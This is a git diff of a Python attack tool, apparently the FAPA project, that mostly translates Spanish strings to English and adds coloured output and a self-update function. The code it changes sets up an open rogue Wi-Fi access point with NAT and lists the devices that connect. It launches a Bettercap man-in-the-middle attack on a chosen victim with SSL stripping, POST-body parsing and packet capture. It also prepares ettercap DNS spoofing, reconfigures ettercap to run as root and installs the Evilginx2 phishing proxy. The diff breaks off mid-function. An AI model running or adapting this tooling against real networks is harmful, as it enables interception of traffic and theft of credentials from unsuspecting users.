@@ -1,5 +1,7 @@
+#!/usr/bin/env python3
 import os
 import subprocess
+import requests
 import re
 import time
 import threading
@@ -8,72 +10,122 @@ import sys
 import shutil
 import threading
 
+# ANSI color codes
+RED     = "\033[91m"
+GREEN   = "\033[92m"
+YELLOW  = "\033[93m"
+BLUE    = "\033[94m"
+MAGENTA = "\033[95m"
+CYAN    = "\033[96m"
+RESET   = "\033[0m"
+
 
 def check_root():
-    """Verifica si el script se ejecuta como root."""
+    """Verifies if the script is running as root."""
     if os.geteuid() != 0:
-        print("[-] Este script debe ejecutarse con privilegios de root. Por favor, ejecútelo con sudo o como root.")
+        print(RED + "[-] This script must be run with root privileges. Please run it with sudo or as root." + RESET)
         sys.exit(1)
 
-def aceptar_codigo_conducta():
-    """Muestra un descargo de responsabilidad y código de conducta, y requiere la aceptación del usuario."""
+
+def accept_code_of_conduct():
+    """Displays a disclaimer and code of conduct, and requires the user's acceptance."""
     conduct_text = """
-    ====================================================================
-            Código de Conducta y Descargo de Responsabilidad
-    ====================================================================
-    Esta herramienta se proporciona únicamente con fines de investigación y pruebas éticas.
-    
-    Usted se compromete a utilizar esta herramienta de manera responsable y solo en entornos autorizados.
-    El uso de esta herramienta en redes o sistemas sin permiso expreso es ilegal y puede conllevar sanciones penales.
-    
-    El desarrollador no se hace responsable de cualquier daño, pérdida o consecuencia legal derivada del uso indebido de esta herramienta.
-    
-    Al continuar, usted confirma que:
-       - Está autorizado para realizar pruebas en el entorno donde se utiliza esta herramienta.
-       - Utilizará esta herramienta únicamente para fines éticos y de investigación.
-    
-    Escriba "I agree" para aceptar y continuar: """
-    respuesta = input(conduct_text)
-    if respuesta.strip().lower() != "i agree":
-        print("[-] No se aceptó el código de conducta. Saliendo...")
+====================================================================
+        Code of Conduct and Disclaimer
+====================================================================
+This tool is provided solely for research and ethical testing purposes.
+
+You agree to use this tool responsibly and only in authorized environments.
+The use of this tool on networks or systems without explicit permission is illegal and may result in criminal penalties.
+
+The developer is not responsible for any damage, loss or legal consequences resulting from the improper use of this tool.
+
+By continuing, you confirm that:
+   - You are authorized to perform tests in the environment where this tool is used.
+   - You will use this tool only for ethical research purposes.
+
+Type "I agree" to accept and continue: """
+    response = input(YELLOW + conduct_text + RESET)
+    if response.strip().lower() != "i agree":
+        print(RED + "[-] Code of conduct not accepted. Exiting..." + RESET)
         sys.exit(1)
 
-# Llamamos a las funciones de comprobación antes de continuar con el resto del script.
+
+def check_for_updates():
+    # URL where the updated version is hosted (in a file "VERSION" in the GitHub repository)
+    VERSION_URL = "https://raw.githubusercontent.com/LvL23HT/FAPA/main/VERSION"
+    
+    print(GREEN + "[+] Checking for updates..." + RESET)
+    try:
+        response = requests.get(VERSION_URL, timeout=5)
+        response.raise_for_status()  # Raise an error if the response is not 200
+        remote_version = response.text.strip()
+        
+        # Compare versions (a simple string comparison here)
+        if remote_version > CURRENT_VERSION:
+            print(GREEN + f"[+] New version detected: {remote_version}. Your current version is {CURRENT_VERSION}." + RESET)
+            option = input(YELLOW + "Do you want to update to the latest version? (y/n): " + RESET).strip().lower()
+            if option == "y" or option == "s":  # "y" for English, "s" for Spanish users switching to English
+                update_script()
+            else:
+                print(CYAN + "[*] Update cancelled by the user." + RESET)
+        else:
+            print(GREEN + "[+] You are running the latest version." + RESET)
+    except Exception as e:
+        print(RED + "[-] Could not check for updates:" + str(e) + RESET)
+
+
+def update_script():
+    try:
+        repo_dir = os.path.dirname(os.path.abspath(__file__))
+        print(GREEN + "[+] Updating the script from the repository..." + RESET)
+        # Run "git pull" in the repository directory.
+        subprocess.run(["git", "-C", repo_dir, "pull"], check=True)
+        print(GREEN + "[+] Update complete. Restarting the script..." + RESET)
+        # Restart the script using the current Python interpreter.
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        print(RED + "[-] Error updating the script:" + str(e) + RESET)
+
+
+# Call the checking functions before continuing with the rest of the script.
 check_root()
-aceptar_codigo_conducta()
+accept_code_of_conduct()
 
+# Global variable for the current script version
+CURRENT_VERSION = "v0.2"
 
+# Global variables for notifications
+notifications_thread = None
+notifications_stop_event = None
 
-# Variables globales para notificaciones
-notificaciones_thread = None
-notificaciones_stop_event = None
-
-# Variables globales
+# Global variables for the fake AP
 ap_interface_global = None
-fake_ap_ssid_global = None  # Variable global para el ESSID del Fake AP
+fake_ap_ssid_global = None  # Global variable for the Fake AP ESSID
 
-def crear_entorno_virtual():
-    # Comprobar si el script ya se está ejecutando en un entorno virtual.
+
+def create_virtual_environment():
+    # Check if the script is already running inside a virtual environment.
     if sys.prefix == sys.base_prefix:
-        print("[+] No se detectó un entorno virtual. Creando 'venv'...")
-        # Crear el entorno virtual si no existe.
+        print(GREEN + "[+] No virtual environment detected. Creating 'venv'..." + RESET)
+        # Create the virtual environment if it doesn't exist.
         if not os.path.exists("venv"):
             subprocess.run([sys.executable, "-m", "venv", "--system-site-packages", "venv"], check=True)
         else:
-            print("[+] El entorno virtual 'venv' ya existe.")
-        # Reiniciar el script usando el intérprete del entorno virtual.
+            print(GREEN + "[+] The virtual environment 'venv' already exists." + RESET)
+        # Restart the script using the virtual environment interpreter.
         venv_python = os.path.join("venv", "bin", "python")
-        print("[+] Reiniciando el script en el entorno virtual...")
+        print(GREEN + "[+] Restarting the script in the virtual environment..." + RESET)
         os.execv(venv_python, [venv_python] + sys.argv)
     else:
-        print("[+] Entorno virtual activo.")
+        print(GREEN + "[+] Virtual environment active." + RESET)
 
 
-def instalar_dependencias():
-    print("[+] Actualizando lista de paquetes...")
+def install_dependencies():
+    print(GREEN + "[+] Updating package list..." + RESET)
     subprocess.run(["sudo", "apt", "update"], check=False)
     
-    paquetes = {
+    packages = {
         "aircrack-ng": "aircrack-ng",
         "hostapd": "hostapd",
         "dnsmasq": "dnsmasq",
@@ -84,69 +136,70 @@ def instalar_dependencias():
         "scapy": "scapy",
     }
     
-    for key, paquete in paquetes.items():
-        result = subprocess.run(["dpkg", "-s", paquete], capture_output=True, text=True)
+    for key, package in packages.items():
+        result = subprocess.run(["dpkg", "-s", package], capture_output=True, text=True)
         if result.returncode != 0:
-            print(f"[+] Instalando {paquete}...")
-            install = subprocess.run(["sudo", "apt", "install", "-y", paquete], capture_output=True, text=True)
+            print(GREEN + f"[+] Installing {package}..." + RESET)
+            install = subprocess.run(["sudo", "apt", "install", "-y", package], capture_output=True, text=True)
             if install.returncode != 0:
-                print(f"[-] Error al instalar {paquete}:")
-                print(install.stderr)
+                print(RED + f"[-] Error installing {package}:" + RESET)
+                print(RED + install.stderr + RESET)
                 
-    # Actualizar dependencias Python para solucionar conflictos con bcrypt y passlib
-    print("[+] Actualizando dependencias Python (bcrypt y passlib)...")
+    # Update Python dependencies to resolve conflicts with bcrypt and passlib
+    print(GREEN + "[+] Upgrading Python dependencies (bcrypt and passlib)..." + RESET)
     subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=False)
     subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "bcrypt", "passlib"], check=False)
     
-    # Instalar Evilginx2 si no está instalado
-    instalar_evilginx2()          
-                
+    # Install Evilginx2 if it is not installed
+    install_evilginx2()
 
 
+def run_command(command):
+    subprocess.run(command, shell=True, check=False)
 
-def ejecutar_comando(comando):
-    subprocess.run(comando, shell=True, check=False)
 
-def listar_interfaces():
-    resultado = subprocess.run(["iw", "dev"], capture_output=True, text=True)
+def list_interfaces():
+    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
     interfaces = []
-    for line in resultado.stdout.split('\n'):
+    for line in result.stdout.split('\n'):
         if "Interface" in line:
             interfaces.append(line.split()[1])
     return interfaces
 
-def seleccionar_interfaz():
-    interfaces = listar_interfaces()
+
+def select_interface():
+    interfaces = list_interfaces()
     if not interfaces:
-        print("[-] No se encontraron interfaces de red inalámbricas.")
+        print(RED + "[-] No wireless network interfaces found." + RESET)
         return None
-    print("[+] Interfaces inalámbricas disponibles:")
+    print(GREEN + "[+] Available wireless interfaces:" + RESET)
     for idx, iface in enumerate(interfaces):
-        print(f"[{idx + 1}] {iface}")
-    seleccion = input("Seleccione la interfaz a utilizar (física, no la monitor): ")
+        print(CYAN + f"[{idx + 1}] {iface}" + RESET)
+    selection = input(YELLOW + "Select the interface to use (physical interface, not monitor): " + RESET)
     try:
-        return interfaces[int(seleccion) - 1]
+        return interfaces[int(selection) - 1]
     except (IndexError, ValueError):
-        print("[-] Selección inválida.")
+        print(RED + "[-] Invalid selection." + RESET)
         return None
-        
+
+
 def get_interface_ip(interface):
     try:
         result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
         for line in result.stdout.splitlines():
             line = line.strip()
             if line.startswith("inet ") and "inet6" not in line:
-                # Se extrae la IP (sin la máscara)
+                # Extract the IP address (without the mask)
                 ip = line.split()[1].split("/")[0]
                 return ip
         return None
     except Exception as e:
-        print("Error obteniendo la IP de la interfaz:", e)
+        print(RED + "Error obtaining the interface IP:" + str(e) + RESET)
         return None
-        
 
-def seleccionar_interfaz_cable():
-    print("[+] Listando interfaces cableadas disponibles...")
+
+def select_wired_interface():
+    print(GREEN + "[+] Listing available wired interfaces..." + RESET)
     try:
         result = subprocess.run("nmcli device status", shell=True, capture_output=True, text=True)
         lines = result.stdout.splitlines()
@@ -156,34 +209,37 @@ def seleccionar_interfaz_cable():
             if len(parts) >= 4 and parts[1].lower() == "ethernet":
                 ethernet_interfaces.append(parts[0])
         if not ethernet_interfaces:
-            print("[-] No se encontraron interfaces cableadas.")
+            print(RED + "[-] No wired interfaces found." + RESET)
             return None
-        print("[+] Interfaces cableadas disponibles:")
+        print(GREEN + "[+] Available wired interfaces:" + RESET)
         for idx, iface in enumerate(ethernet_interfaces):
-            print(f"[{idx + 1}] {iface}")
-        seleccion = input("Seleccione la interfaz de salida (por cable): ")
-        return ethernet_interfaces[int(seleccion) - 1]
+            print(CYAN + f"[{idx + 1}] {iface}" + RESET)
+        selection = input(YELLOW + "Select the wired (output) interface: " + RESET)
+        return ethernet_interfaces[int(selection) - 1]
     except Exception as e:
-        print("Error al listar interfaces cableadas:", e)
+        print(RED + "Error listing wired interfaces:" + str(e) + RESET)
         return None
 
-def resetear_interfaz(interface):
-    print(f"[+] Reiniciando la interfaz {interface} y eliminando procesos en conflicto...")
-    ejecutar_comando("sudo systemctl stop wpa_supplicant")
-    ejecutar_comando("sudo systemctl stop hostapd")
-    ejecutar_comando("sudo systemctl stop dnsmasq")
-    ejecutar_comando("sudo killall -9 wpa_supplicant hostapd dnsmasq")
-    ejecutar_comando(f"sudo ip link set {interface} down")
-    ejecutar_comando("sudo rfkill unblock all")
 
-def habilitar_modo_ap(interface):
-    print(f"[+] Configurando {interface} en modo AP...")
-    ejecutar_comando(f"sudo ip link set {interface} down")
-    ejecutar_comando(f"sudo iw dev {interface} set type __ap")
-    ejecutar_comando(f"sudo ip link set {interface} up")
+def reset_interface(interface):
+    print(GREEN + f"[+] Resetting interface {interface} and terminating conflicting processes..." + RESET)
+    run_command("sudo systemctl stop wpa_supplicant")
+    run_command("sudo systemctl stop hostapd")
+    run_command("sudo systemctl stop dnsmasq")
+    run_command("sudo killall -9 wpa_supplicant hostapd dnsmasq")
+    run_command(f"sudo ip link set {interface} down")
+    run_command("sudo rfkill unblock all")
+
+
+def enable_ap_mode(interface):
+    print(GREEN + f"[+] Configuring {interface} in AP mode..." + RESET)
+    run_command(f"sudo ip link set {interface} down")
+    run_command(f"sudo iw dev {interface} set type __ap")
+    run_command(f"sudo ip link set {interface} up")
     return interface
 
-def configurar_dnsmasq(interface, dhcp_range, lease_time):
+
+def configure_dnsmasq(interface, dhcp_range, lease_time):
     dnsmasq_config = f"""
 interface={interface}
 dhcp-range={dhcp_range},{lease_time}
@@ -194,44 +250,48 @@ log-dhcp
 """
     with open("/etc/dnsmasq.conf", "w") as file:
         file.write(dnsmasq_config)
-    ejecutar_comando("sudo systemctl restart dnsmasq")
+    run_command("sudo systemctl restart dnsmasq")
 
-def configurar_red(interface):
-    ejecutar_comando(f"sudo ip link set {interface} down")
-    ejecutar_comando(f"sudo ip addr flush dev {interface}")
-    ejecutar_comando(f"sudo ip addr add 192.168.1.1/24 dev {interface}")
-    ejecutar_comando(f"sudo ip link set {interface} up")
 
-def iniciar_hostapd():
-    print("[+] Desenmascarando hostapd...")
-    ejecutar_comando("sudo systemctl unmask hostapd")
-    print("[+] Iniciando hostapd...")
-    ejecutar_comando("sudo systemctl restart hostapd")
+def configure_network(interface):
+    run_command(f"sudo ip link set {interface} down")
+    run_command(f"sudo ip addr flush dev {interface}")
+    run_command(f"sudo ip addr add 192.168.1.1/24 dev {interface}")
+    run_command(f"sudo ip link set {interface} up")
 
-def habilitar_nat():
-    print("[+] Habilitando NAT para proporcionar acceso a Internet a los clientes conectados...")
-    ejecutar_comando("sudo sysctl -w net.ipv4.ip_forward=1")
-    external_interface = seleccionar_interfaz_cable()
+
+def start_hostapd():
+    print(GREEN + "[+] Unmasking hostapd..." + RESET)
+    run_command("sudo systemctl unmask hostapd")
+    print(GREEN + "[+] Starting hostapd..." + RESET)
+    run_command("sudo systemctl restart hostapd")
+
+
+def enable_nat():
+    print(GREEN + "[+] Enabling NAT to provide Internet access to connected clients..." + RESET)
+    run_command("sudo sysctl -w net.ipv4.ip_forward=1")
+    external_interface = select_wired_interface()
     if not external_interface:
-        print("[-] No se ha seleccionado una interfaz cableada. NAT no se configurará.")
+        print(RED + "[-] No wired interface was selected. NAT will not be configured." + RESET)
     else:
-        ejecutar_comando("sudo iptables -t nat -F")
-        ejecutar_comando(f"sudo iptables -t nat -A POSTROUTING -o {external_interface} -j MASQUERADE")
-        print(f"[+] NAT habilitado usando la interfaz {external_interface}.")
+        run_command("sudo iptables -t nat -F")
+        run_command(f"sudo iptables -t nat -A POSTROUTING -o {external_interface} -j MASQUERADE")
+        print(GREEN + f"[+] NAT enabled using interface {external_interface}." + RESET)
+
 
 def setup_fake_ap():
     global ap_interface_global, fake_ap_ssid_global
-    ssid = input("Ingrese el nombre del Fake AP: ") or "Free_WiFi"
+    ssid = input(YELLOW + "Enter the Fake AP name: " + RESET) or "Free_WiFi"
     fake_ap_ssid_global = ssid
-    channel = input("Ingrese el canal (default 6): ") or "6"
-    interface = seleccionar_interfaz()
+    channel = input(YELLOW + "Enter the channel (default 6): " + RESET) or "6"
+    interface = select_interface()
     if not interface:
         return
-    resetear_interfaz(interface)
-    ejecutar_comando(f"sudo nmcli device set {interface} managed no")
-    ap_interface = habilitar_modo_ap(interface)
+    reset_interface(interface)
+    run_command(f"sudo nmcli device set {interface} managed no")
+    ap_interface = enable_ap_mode(interface)
     ap_interface_global = ap_interface
-    print(f"[+] Configurando Fake Access Point en {ap_interface}...")
+    print(GREEN + f"[+] Setting up Fake Access Point on {ap_interface}..." + RESET)
     hostapd_config_path = "/etc/hostapd/hostapd.conf"
     with open(hostapd_config_path, "w") as f:
         f.write(f"""
@@ -248,18 +308,20 @@ channel={channel}
 auth_algs=1
 wpa=0
 """.strip())
-    configurar_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
-    configurar_red(ap_interface)
-    iniciar_hostapd()
-    habilitar_nat()
+    configure_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
+    configure_network(ap_interface)
+    start_hostapd()
+    enable_nat()
 
-def recuperar_interfaz(interface):
-    print(f"[+] Recuperando la interfaz {interface} a modo Managed...")
-    ejecutar_comando(f"sudo nmcli device set {interface} managed yes")
-    ejecutar_comando(f"sudo ip link set {interface} down")
-    ejecutar_comando(f"sudo iw dev {interface} set type managed")
-    ejecutar_comando(f"sudo ip link set {interface} up")
-    print("[+] Interfaz recuperada a modo Managed.")
+
+def recover_interface(interface):
+    print(GREEN + f"[+] Recovering interface {interface} back to Managed mode..." + RESET)
+    run_command(f"sudo nmcli device set {interface} managed yes")
+    run_command(f"sudo ip link set {interface} down")
+    run_command(f"sudo iw dev {interface} set type managed")
+    run_command(f"sudo ip link set {interface} up")
+    print(GREEN + "[+] Interface recovered to Managed mode." + RESET)
+
 
 def get_dhcp_leases():
     leases = {}
@@ -272,33 +334,34 @@ def get_dhcp_leases():
                     hostname = parts[3] if len(parts) >= 4 else ""
                     leases[mac.lower()] = {"IP": ip, "hostname": hostname}
     except Exception as e:
-        print("Error al leer las leases de dnsmasq:", e)
+        print(RED + "Error reading dnsmasq leases:" + str(e) + RESET)
     return leases
-    
-    
-def menu_configuracion_red():
+
+
+def network_configuration_menu():
     while True:
-        print("""
-[CONFIGURACIÓN DE RED]
-  1) Configurar Fake AP (Personalizar)
-  2) Automatizar Configuracion (Por defecto)
-  3) Volver al Menú Principal
-        """)
-        opcion = input("Seleccione una opción: ").strip()
-        if opcion == "1":
+        print(BLUE + """
+[NETWORK CONFIGURATION]
+  1) Configure Fake AP (Custom)
+  2) Automate Configuration (Default)
+  3) Back to Main Menu
+""" + RESET)
+        option = input(YELLOW + "Select an option: " + RESET).strip()
+        if option == "1":
             setup_fake_ap()
-        elif opcion == "2":
-            automatizar_configuracion_red()
-        elif opcion == "3":
+        elif option == "2":
+            automate_network_configuration()
+        elif option == "3":
             break
         else:
-            print("[-] Opción inválida, intente de nuevo.\n")    
+            print(RED + "[-] Invalid option, please try again.\n" + RESET)
+
 
 def get_connected_stations():
     try:
         output = subprocess.check_output("sudo hostapd_cli all_sta", shell=True, text=True)
     except Exception as e:
-        print("Error al ejecutar hostapd_cli:", e)
+        print(RED + "Error executing hostapd_cli:" + str(e) + RESET)
         return []
     stations = []
     current_station = None
@@ -322,58 +385,61 @@ def get_connected_stations():
             station.update(leases[mac])
     return stations
 
-def monitorear_clientes():
-    print("Monitoreo de clientes conectados (hostapd). Presiona ENTER para detener.")
+
+def monitor_clients():
+    print(GREEN + "Monitoring connected clients (hostapd). Press ENTER to stop." + RESET)
     stop_event = threading.Event()
     previous_stations = []
+
     def monitor():
         nonlocal previous_stations
         while not stop_event.is_set():
             current_stations = get_connected_stations()
             if current_stations != previous_stations:
                 os.system("clear")
-                print("----- Clientes Conectados (hostapd) -----")
+                print(MAGENTA + "----- Connected Clients (hostapd) -----" + RESET)
                 if current_stations:
                     for station in current_stations:
                         mac = station.get("MAC", "N/A")
                         ip = station.get("IP", "N/A")
                         hostname = station.get("hostname", "N/A")
-                        print(f"MAC: {mac} | IP: {ip} | Hostname: {hostname}")
+                        print(CYAN + f"MAC: {mac} | IP: {ip} | Hostname: {hostname}" + RESET)
                 else:
-                    print("No hay clientes conectados.")
+                    print(RED + "No clients connected." + RESET)
                 previous_stations = current_stations
             time.sleep(5)
     t = threading.Thread(target=monitor, daemon=True)
     t.start()
-    input("Presiona ENTER para detener el monitoreo...")
+    input(YELLOW + "Press ENTER to stop monitoring..." + RESET)
     stop_event.set()
     t.join(timeout=1)
-    print("Monitoreo detenido.")
+    print(GREEN + "Monitoring stopped." + RESET)
+
 
 def start_mitm_attack():
-    objetivo = seleccionar_objetivo()
-    if not objetivo:
-        print("[-] No se pudo seleccionar un objetivo.")
+    target = select_target()
+    if not target:
+        print(RED + "[-] Could not select a target." + RESET)
         return
-    target_ip = objetivo.get("IP")
+    target_ip = target.get("IP")
     if not target_ip:
-        print("[-] No se encontró una IP para el objetivo seleccionado.")
+        print(RED + "[-] No IP found for the selected target." + RESET)
         return
-    iface = input("Ingrese la interfaz para el ataque MITM (dejar en blanco para usar la interfaz AP): ").strip()
+    iface = input(YELLOW + "Enter the interface for the MITM attack (leave blank to use the AP interface): " + RESET).strip()
     if iface == "" and ap_interface_global is not None:
         iface = ap_interface_global
     if not iface:
-        print("[-] No se ha seleccionado una interfaz para MITM.")
+        print(RED + "[-] No interface selected for MITM." + RESET)
         return
-    print(f"Iniciando ataque MITM en la interfaz {iface} contra el objetivo {target_ip} con Bettercap...")
+    print(GREEN + f"Starting MITM attack on interface {iface} against target {target_ip} using Bettercap..." + RESET)
     log_path = "/home/kali/Desktop/bettercap_log.txt"
-    print("Se abrirá una nueva ventana de terminal con Bettercap en modo interactivo.")
-    print("Dentro de esa ventana podrás usar comandos como:")
-    print("  - help     : ver la lista de comandos")
-    print("  - net.show : mostrar dispositivos conectados")
-    print("  - arp.show : mostrar la tabla ARP")
-    print("  - exit     : salir de Bettercap")
-    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
+    print(CYAN + "A new terminal window will open with Bettercap in interactive mode." + RESET)
+    print(CYAN + "Inside that window you can use commands such as:" + RESET)
+    print(CYAN + "  - help     : list available commands" + RESET)
+    print(CYAN + "  - net.show : show connected devices" + RESET)
+    print(CYAN + "  - arp.show : show the ARP table" + RESET)
+    print(CYAN + "  - exit     : exit Bettercap" + RESET)
+    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
     try:
         cmd = (
             f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo bettercap -iface {iface} "
@@ -382,41 +448,43 @@ def start_mitm_attack():
             f"set net.sniff.output /home/kali/Desktop/bettercap_capture.pcap; net.sniff on; "
             f"set http.proxy.sslstrip true; set http.proxy.parse_post true; http.proxy on; "
             f"events.stream off; events.stream on\"; exec bash'"
-       )
+        )
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para volver al menú principal...")
+        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("Ataque MITM detenido. Revisa el log en:", log_path)
+        print(GREEN + "MITM attack stopped. Check the log at:" + RESET, log_path)
     except Exception as e:
-        print("Error al iniciar Bettercap en una nueva ventana:", e)
+        print(RED + "Error starting Bettercap in a new terminal window:" + str(e) + RESET)
 
-def seleccionar_objetivo():
+
+def select_target():
     stations = get_connected_stations()
     if not stations:
-        print("[-] No se encontraron dispositivos conectados.")
+        print(RED + "[-] No connected devices found." + RESET)
         return None
-    print("Dispositivos conectados:")
+    print(GREEN + "Connected devices:" + RESET)
     for i, station in enumerate(stations):
         ip = station.get("IP", "N/A")
         mac = station.get("MAC", "N/A")
         hostname = station.get("hostname", "N/A")
-        print(f"[{i + 1}] IP: {ip} | MAC: {mac} | Hostname: {hostname}")
-    seleccion = input("Seleccione el número del dispositivo a atacar: ")
+        print(CYAN + f"[{i + 1}] IP: {ip} | MAC: {mac} | Hostname: {hostname}" + RESET)
+    selection = input(YELLOW + "Select the number of the device to attack: " + RESET)
     try:
-        index = int(seleccion) - 1
+        index = int(selection) - 1
         if index < 0 or index >= len(stations):
-            print("[-] Selección inválida.")
+            print(RED + "[-] Invalid selection." + RESET)
             return None
         return stations[index]
     except Exception as e:
-        print("Error al seleccionar el objetivo:", e)
+        print(RED + "Error selecting target:" + str(e) + RESET)
         return None
 
-def crear_caplet_dns_spoof(target_ip):
-    # Crea un caplet temporal con los comandos para DNS spoofing.
+
+def create_dns_spoof_caplet(target_ip):
+    # Creates a temporary caplet with the commands for DNS spoofing.
     caplet_path = "/tmp/ettercap_dns.cap"
-    contenido = (
+    content = (
         f'set log.output.file /home/kali/Desktop/ettercap_log.txt;\n'
         f'set arp.spoof.targets "//{target_ip}//";\n'
         'set arp.spoof.fullduplex true;\n'
@@ -431,11 +499,12 @@ def crear_caplet_dns_spoof(target_ip):
     )
     try:
         with open(caplet_path, "w") as f:
-            f.write(contenido)
-        print(f"[+] Caplet para DNS Spoofing creado en: {caplet_path}")
+            f.write(content)
+        print(GREEN + f"[+] DNS Spoofing caplet created at: {caplet_path}" + RESET)
     except Exception as e:
-        print("Error al crear el caplet:", e)
+        print(RED + "Error creating the caplet:" + str(e) + RESET)
     return caplet_path
+
 
 def get_default_gateway():
     try:
@@ -446,29 +515,30 @@ def get_default_gateway():
         else:
             return None
     except Exception as e:
-        print("Error al obtener la IP del gateway:", e)
+        print(RED + "Error obtaining the gateway IP:" + str(e) + RESET)
         return None
-        
+
+
 import re
 import subprocess
 
-def configurar_ettercap_conf():
+def configure_ettercap_conf():
     config_path = "/etc/ettercap/etter.conf"
     backup_path = "/etc/ettercap/etter.conf.bak"
     
     try:
-        # Hacer copia de seguridad
+        # Create a backup
         subprocess.run(f"sudo cp {config_path} {backup_path}", shell=True, check=True)
-        print("[+] Copia de seguridad de etter.conf creada en:", backup_path)
+        print(GREEN + "[+] Backup of etter.conf created at:" + RESET, backup_path)
         
-        # Leer el archivo original
+        # Read the original file
         with open(config_path, "r") as f:
             lines = f.readlines()
         
         new_lines = []
         for line in lines:
             stripped = line.lstrip()
-            # Si la línea está comentada, no se modifica
+            # Do not modify commented lines
             if stripped.startswith("#"):
                 new_lines.append(line)
             elif stripped.startswith("redir_command_on"):
@@ -476,7 +546,7 @@ def configurar_ettercap_conf():
             elif stripped.startswith("redir_command_off"):
                 new_lines.append('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports 8080";\n')
             elif stripped.startswith("ec_uid"):
-                # Reemplazar el número (p.ej. 65534) por 0, preservando el comentario
+                # Replace the number (e.g., 65534) with 0, preserving the comment
                 new_line = re.sub(r'^(ec_uid\s*=\s*)\d+', r'\1 0', line)
                 new_lines.append(new_line)
             elif stripped.startswith("ec_gid"):
@@ -485,253 +555,244 @@ def configurar_ettercap_conf():
             else:
                 new_lines.append(line)
         
-        # Escribir en un archivo temporal y luego moverlo
+        # Write to a temporary file and then move it
         with open("/tmp/etter.conf", "w") as f:
             f.writelines(new_lines)
         
         subprocess.run(f"sudo mv /tmp/etter.conf {config_path}", shell=True, check=True)
-        print("[+] etter.conf actualizado correctamente.")
+        print(GREEN + "[+] etter.conf updated successfully." + RESET)
     except Exception as e:
-        print("Error al actualizar etter.conf:", e)
+        print(RED + "Error updating etter.conf:" + str(e) + RESET)
 
-
-
-        
 
 def set_iptables_legacy():
     try:
         subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-legacy", shell=True, check=True)
         subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy", shell=True, check=True)
-        # Vaciar las reglas de nftables (si existen)
+        # Flush nftables rules (if any)
         subprocess.run("sudo nft flush ruleset", shell=True, check=True)
-        print("[+] Iptables configurado a legacy y nftables flushed.")
+        print(GREEN + "[+] Iptables set to legacy and nftables flushed." + RESET)
     except Exception as e:
-        print("Error configurando iptables a legacy:", e)
+        print(RED + "Error configuring iptables to legacy:" + str(e) + RESET)
+
 
 def restore_iptables_nft():
     try:
         subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-nft", shell=True, check=True)
         subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-nft", shell=True, check=True)
-        # Opcional: recargar o reiniciar el servicio nftables si es necesario
+        # Optionally restart nftables service if needed
         subprocess.run("sudo systemctl restart nftables", shell=True, check=True)
-        print("[+] Iptables restaurado a nft.")
+        print(GREEN + "[+] Iptables restored to nft." + RESET)
     except Exception as e:
-        print("Error restaurando iptables a nft:", e)
-        
-        
+        print(RED + "Error restoring iptables to nft:" + str(e) + RESET)
 
-def configurar_etter_dns(dominio, ip_destino):
+
+def configure_etter_dns(domain, destination_ip):
     dns_file = "/etc/ettercap/etter.dns"
     backup_file = "/etc/ettercap/etter.dns.bak"
     try:
-        # Realizar copia de seguridad
+        # Create a backup
         subprocess.run(f"sudo cp {dns_file} {backup_file}", shell=True, check=True)
-        print("[+] Copia de seguridad de etter.dns creada en:", backup_file)
+        print(GREEN + "[+] Backup of etter.dns created at:" + RESET, backup_file)
         
-        # Leer el archivo línea por línea
+        # Read the file line by line
         with open(dns_file, "r") as f:
             lines = f.readlines()
         
-        nueva_regla = f"{dominio} A {ip_destino}\n"
-        regla_existente = False
+        new_rule = f"{domain} A {destination_ip}\n"
+        rule_exists = False
         new_lines = []
         for line in lines:
-            # Comprobamos si la línea, al quitar espacios, empieza exactamente con el dominio seguido de un espacio
-            if line.lstrip().startswith(dominio + " "):
-                new_lines.append(nueva_regla)
-                regla_existente = True
+            # Check if the line (trimmed) starts exactly with the domain followed by a space
+            if line.lstrip().startswith(domain + " "):
+                new_lines.append(new_rule)
+                rule_exists = True
             else:
                 new_lines.append(line)
         
-        # Si no se encontró una regla existente, se añade al final
-        if not regla_existente:
-            new_lines.append(nueva_regla)
+        # If no rule exists, add it at the end
+        if not rule_exists:
+            new_lines.append(new_rule)
         
-        # Escribir el contenido actualizado en un archivo temporal y moverlo al archivo original
+        # Write the updated content to a temporary file and move it to the original file
         with open("/tmp/etter.dns", "w") as f:
             f.writelines(new_lines)
         subprocess.run(f"sudo mv /tmp/etter.dns {dns_file}", shell=True, check=True)
-        print(f"[+] Regla para {dominio} actualizada correctamente en etter.dns.")
+        print(GREEN + f"[+] Rule for {domain} updated successfully in etter.dns." + RESET)
     except Exception as e:
-        print("Error al actualizar etter.dns:", e)
+        print(RED + "Error updating etter.dns:" + str(e) + RESET)
 
-        
 
-def solicitar_redirecciones():
+def request_redirections():
     """
-    Solicita al usuario múltiples redirecciones y las valida.
-    Devuelve una lista de tuplas (dominio, ip_destino).
+    Prompts the user for multiple redirections and validates them.
+    Returns a list of tuples (domain, destination_ip).
     """
-    redirecciones = []
+    redirections = []
     while True:
-        dominio = input("Ingrese el dominio a redirigir (o dejar en blanco para terminar): ").strip()
-        if dominio == "":
+        domain = input(YELLOW + "Enter the domain to redirect (or leave blank to finish): " + RESET).strip()
+        if domain == "":
             break
-        # Validar el formato del dominio (acepta tanto "google.com" como "*.google.com")
-        if not re.match(r'^(?:\*\.)?[\w.-]+\.[a-zA-Z]{2,}$', dominio):
-            print("[-] El formato del dominio ingresado no es correcto.")
+        # Validate the domain format (accepts both "google.com" and "*.google.com")
+        if not re.match(r'^(?:\*\.)?[\w.-]+\.[a-zA-Z]{2,}$', domain):
+            print(RED + "[-] The entered domain format is not correct." + RESET)
             continue
 
